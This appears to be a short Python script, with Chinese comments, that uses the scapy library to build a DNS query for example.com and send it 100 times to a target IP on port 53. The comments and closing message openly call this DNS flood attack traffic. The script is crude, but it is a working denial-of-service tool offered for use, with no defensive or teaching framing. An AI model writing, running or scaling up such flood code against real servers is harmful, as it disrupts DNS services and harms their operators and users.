from scapy.all import *

# 定义目标IP地址和端口号
target_ip = "0.0.0.0"
target_port = 53

# 构造DNS请求包
packet = IP(dst=target_ip)/UDP(dport=target_port)/DNS(qd=DNSQR(qname="example.com", qtype="A", qclass="IN"))

# 发送DNS请求包
send(packet*100)  # 发送100个包作为攻击流量

print("DNS Flood攻击包已发送至目标IP地址：", target_ip)
